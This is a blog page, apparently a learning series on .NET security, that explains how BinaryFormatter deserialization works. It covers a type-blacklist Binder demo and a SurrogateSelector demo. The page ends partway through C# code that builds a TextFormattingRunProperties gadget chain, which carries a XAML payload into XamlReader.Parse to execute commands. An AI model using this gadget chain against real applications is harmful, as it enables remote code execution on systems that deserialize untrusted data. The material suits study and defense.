<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>【.NET 安全】ASP.NET BinaryFormatter Deserialization 03 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="【.NET 安全】ASP.NET BinaryFormatter Deserialization 03 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/02/07/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20BinaryFormatter%20Deserialization%2003/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-02-07T13:39:42.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>February</span>
            <span>7,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">【.NET 安全】ASP.NET BinaryFormatter Deserialization 03</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a target="_blank" rel="noopener" href="https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/BinaryFormatter.md</a></p>
<h1 id="01-BinaryFormatter-基本结构及使用"><a href="#01-BinaryFormatter-基本结构及使用" class="headerlink" title="01-BinaryFormatter 基本结构及使用"></a>01-BinaryFormatter 基本结构及使用</h1><p>今天要学习的BinaryFormatter是整个反序列化系列最经典的一个Formatter，之后我们要学习的SoapFormatter以及LosFormatter等等都是基于BinaryFormatter，最终都会回到这里，因此本节的内容会比较多。<br>官方文档：<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=net-8.0">https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=net-8.0</a><br>在第一节01中我们已经介绍过它的一些基本用法<br><a href="https://boogipop.com/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/">https://boogipop.com/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/</a><br>官方文档给出了更为详细的结构<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707231279465-08727b1a-7a5a-41a5-b884-ee0d73312caa.png#averageHue=%23fcfbfa&clientId=u7feef530-7708-4&from=paste&height=430&id=u7b76cc49&originHeight=537&originWidth=1096&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44283&status=done&style=none&taskId=u9dc4fb99-bed3-4c42-91f3-490b7ec7ae4&title=&width=876.8" alt="image.png"><br>其中我们需要注意的是Binder和SurrogateSelector，我们可以理解为”过滤器”和”代理器”，先讲讲过滤器的用法</p>
<h2 id="01-1-Binder-过滤器"><a href="#01-1-Binder-过滤器" class="headerlink" title="01-1 Binder 过滤器"></a>01-1 Binder 过滤器</h2><p>这里给出一段Demo代码如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CustomSerializationBinder</span> : <span class="title">SerializationBinder</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Type <span class="title">BindToType</span>(<span class="params"><span class="built_in">string</span> assemblyName, <span class="built_in">string</span> typeName</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在反序列化时，检查类型是否在黑名单中</span></span><br><span class="line">        <span class="keyword">if</span> (IsTypeInBlacklist(typeName))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SerializationException(<span class="string">&quot;Deserialization of this type is not allowed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用默认绑定</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="built_in">bool</span> <span class="title">IsTypeInBlacklist</span>(<span class="params"><span class="built_in">string</span> typeName</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在这里添加黑名单检查的逻辑</span></span><br><span class="line">        <span class="comment">// 返回 true 表示在黑名单中，返回 false 表示不在黑名单中</span></span><br><span class="line">        <span class="keyword">return</span> typeName.Contains(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="meta">Serializable</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EvilClass</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">Serializable</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">object</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建对象实例</span></span><br><span class="line">        MyClass myObject = <span class="keyword">new</span> MyClass &#123; Name = <span class="string">&quot;John&quot;</span>, Age = <span class="number">25</span> &#125;;</span><br><span class="line">        <span class="keyword">var</span> evilClass = <span class="keyword">new</span> EvilClass();</span><br><span class="line">        myObject.data = evilClass;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用BinaryFormatter进行序列化，并设置自定义的SerializationBinder</span></span><br><span class="line">        BinaryFormatter formatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">        formatter.Binder = <span class="keyword">new</span> CustomSerializationBinder();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">using</span> (MemoryStream stream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">        &#123;</span><br><span class="line">            formatter.Serialize(stream, myObject);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将流位置重置为开始</span></span><br><span class="line">            stream.Seek(<span class="number">0</span>, SeekOrigin.Begin);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 使用BinaryFormatter进行反序列化</span></span><br><span class="line">                MyClass deserializedObject = (MyClass)formatter.Deserialize(stream);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 输出反序列化后的对象属性</span></span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;Name: <span class="subst">&#123;deserializedObject.Name&#125;</span>, Age: <span class="subst">&#123;deserializedObject.Age&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (SerializationException ex)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 处理反序列化异常</span></span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;Error during deserialization: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码的结果为<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707231530785-dac838c2-4d44-4dc4-a14b-96a38d3971d1.png#averageHue=%2327282c&clientId=u7feef530-7708-4&from=paste&height=158&id=uc81cf33f&originHeight=197&originWidth=1640&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30665&status=done&style=none&taskId=ub5b8e5d7-cb05-49a0-a90f-844fa5dfcde&title=&width=1312" alt="image.png"><br>结果很显然我们的EvilCLass被过滤了，在这里我们定义了自己的过滤器<code>CustomSerializationBinder</code>，这里可以进行对流的拦截处理。这个过程和Java反序列化中的Resolveclass顺序是一致的，先读取当前类的类型，再读取成员变量的类型，最后还原成对象。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">      <span class="keyword">this</span>.objectName = objectName;</span><br><span class="line">      <span class="keyword">this</span>.memberNames = memberNames;</span><br><span class="line">      <span class="keyword">this</span>.binaryTypeEnumA = binaryTypeEnumA;</span><br><span class="line">      <span class="keyword">this</span>.typeInformationA = typeInformationA;</span><br><span class="line">      <span class="keyword">this</span>.objectReader = objectReader;</span><br><span class="line">      <span class="keyword">this</span>.objectId = objectId;</span><br><span class="line">      <span class="keyword">this</span>.assemblyInfo = assemblyInfo;</span><br><span class="line">      <span class="keyword">if</span> (assemblyInfo == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SerializationException(Environment.GetResourceString(<span class="string">&quot;Serialization_Assembly&quot;</span>, (<span class="built_in">object</span>) objectName));</span><br><span class="line">      <span class="keyword">this</span>.objectType = objectReader.GetType(assemblyInfo, objectName);</span><br><span class="line">      <span class="keyword">this</span>.memberTypes = <span class="keyword">new</span> Type[memberNames.Length];</span><br><span class="line">      <span class="keyword">for</span> (<span class="built_in">int</span> index = <span class="number">0</span>; index &lt; memberNames.Length; ++index)</span><br><span class="line">      &#123;</span><br><span class="line">        Type type;</span><br><span class="line">        BinaryConverter.TypeFromInfo(binaryTypeEnumA[index], typeInformationA[index], objectReader, (BinaryAssemblyInfo) assemIdToAssemblyTable[memberAssemIds[index]], <span class="keyword">out</span> InternalPrimitiveTypeE _, <span class="keyword">out</span> <span class="built_in">string</span> _, <span class="keyword">out</span> type, <span class="keyword">out</span> <span class="built_in">bool</span> _);</span><br><span class="line">        <span class="keyword">this</span>.memberTypes[index] = type;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">this</span>.objectInfo = objectReader.CreateReadObjectInfo(<span class="keyword">this</span>.objectType, memberNames, (Type[]) <span class="literal">null</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.objectInfo.isSi)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">this</span>.objectInfo.GetMemberTypes(memberNames, <span class="keyword">this</span>.objectInfo.objectType);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>主要代码是上面这一段ObjectMap的构造方法里面的逻辑。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Type <span class="title">BindToType</span>(<span class="params"><span class="built_in">string</span> assemblyName, <span class="built_in">string</span> typeName</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在反序列化时，检查类型是否在黑名单中</span></span><br><span class="line">        <span class="keyword">if</span> (IsTypeInBlacklist(typeName))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SerializationException(<span class="string">&quot;Deserialization of this type is not allowed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用默认绑定</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终通过BindToType方法进行放行，如果不在黑名单里直接return即可。</p>
<h2 id="01-2-SurrogateSelector-代理器"><a href="#01-2-SurrogateSelector-代理器" class="headerlink" title="01-2 SurrogateSelector 代理器"></a>01-2 SurrogateSelector 代理器</h2><p>代理器可以让一个本不可以序列化的对象完成序列化和反序列化，而无需<code>[Serializable]</code>的注解。具体例子如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Permissions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NormalSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyObject</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyObject</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.str = str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> str &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyObject</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Constructor&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">MySerializationSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetObjectData of ISerializationSurrogate&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;str&quot;</span>, ((MyObject)obj).str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">SetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;SetObjectData of ISerializationSurrogate&quot;</span>);</span><br><span class="line">            MyObject m = <span class="keyword">new</span> MyObject();</span><br><span class="line">            m.str = (<span class="built_in">string</span>)info.GetValue(<span class="string">&quot;str&quot;</span>, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line">            <span class="keyword">return</span> m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                MyObject myObject = <span class="keyword">new</span> MyObject();</span><br><span class="line">                myObject.str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 构建formatter</span></span><br><span class="line">                    BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 设置序列化代理选择器</span></span><br><span class="line">                    SurrogateSelector ss = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">                    ss.AddSurrogate(<span class="keyword">typeof</span>(MyObject), binaryFormatter.Context, <span class="keyword">new</span> MySerializationSurrogate());</span><br><span class="line">                    <span class="comment">// 赋值给formatter 这里是否设置代理选择器决定了序列化的生命周期</span></span><br><span class="line">                    binaryFormatter.SurrogateSelector = ss;</span><br><span class="line">                    <span class="comment">// 序列化</span></span><br><span class="line">                    binaryFormatter.Serialize(memoryStream, myObject);</span><br><span class="line">                    <span class="comment">// 重置stream</span></span><br><span class="line">                    memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                    myObject = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 反序列化</span></span><br><span class="line">                    myObject = (MyObject)binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">                    Console.WriteLine(myObject.str);    <span class="comment">// hello</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.StackTrace);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>MyObject本是一个不可序列化的类，但是加了代理器后仍然可以进行处理<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707232395200-dd087d41-6501-428e-a3b4-6eb763e527ea.png#averageHue=%2327272a&clientId=u7feef530-7708-4&from=paste&height=183&id=ubaec8903&originHeight=229&originWidth=1709&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38214&status=done&style=none&taskId=ufcc3a7b3-2262-4c5b-b9f4-7121b8f0f45&title=&width=1367.2" alt="image.png"><br>这一点在第一篇文章也有类似体现</p>
<h1 id="02-TextFormattingRunProperties-amp-DataSet-利用链"><a href="#02-TextFormattingRunProperties-amp-DataSet-利用链" class="headerlink" title="02-TextFormattingRunProperties&amp;DataSet 利用链"></a>02-TextFormattingRunProperties&amp;DataSet 利用链</h1><h2 id="02-1-TextFormattingRunProperties"><a href="#02-1-TextFormattingRunProperties" class="headerlink" title="02-1 TextFormattingRunProperties"></a>02-1 TextFormattingRunProperties</h2><p>通过上述一些介绍这里就可以延伸出一条比较经典的利用链<code>TextFormattingRunProperties</code><br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.text.formatting.textformattingrunproperties?view=visualstudiosdk-2022">https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.text.formatting.textformattingrunproperties?view=visualstudiosdk-2022</a><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707232890484-69566150-349e-4032-87f2-6110d10d23f5.png#averageHue=%231f1f1e&clientId=u7feef530-7708-4&from=paste&height=342&id=u426e06c7&originHeight=427&originWidth=1141&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46655&status=done&style=none&taskId=u0645a6de-756e-42ee-8d56-ed59f2ad0eb&title=&width=912.8" alt="image.png"><br>该类实现了ISerializable接口，那么我们就可以去关注一下它的构造方法以及GetObjectData和SetObjectData了。<br>它的构造方法比较有意思<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707233113287-0ddbb588-2805-4440-9c1e-902e21e0d0a1.png#averageHue=%23282321&clientId=u7feef530-7708-4&from=paste&height=297&id=u1cd0576d&originHeight=371&originWidth=1305&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132149&status=done&style=none&taskId=u8c075157-6562-420f-a548-74e49ac27b0&title=&width=1044" alt="image.png"><br>其中<code>GetObjectFromSerializationInfo</code>逻辑如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707233136388-b1e180dd-f541-45b6-8e7e-aa33fc24255b.png#averageHue=%23231f1e&clientId=u7feef530-7708-4&from=paste&height=146&id=u93f0c905&originHeight=183&originWidth=1072&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36794&status=done&style=none&taskId=ua05c3a64-4bd1-4712-ab68-d47d1638668&title=&width=857.6" alt="image.png"><br>Binggo，见到了熟悉的XamlReader.Parse，那么整条链子也就串起来了，我们需要做的就是给他的<code>ForegroundBrush</code>或者是<code>BackgroundBrush</code>属性赋值为我们Xaml的payload即可完成命令执行。<br>payload代码如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BinaryFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span 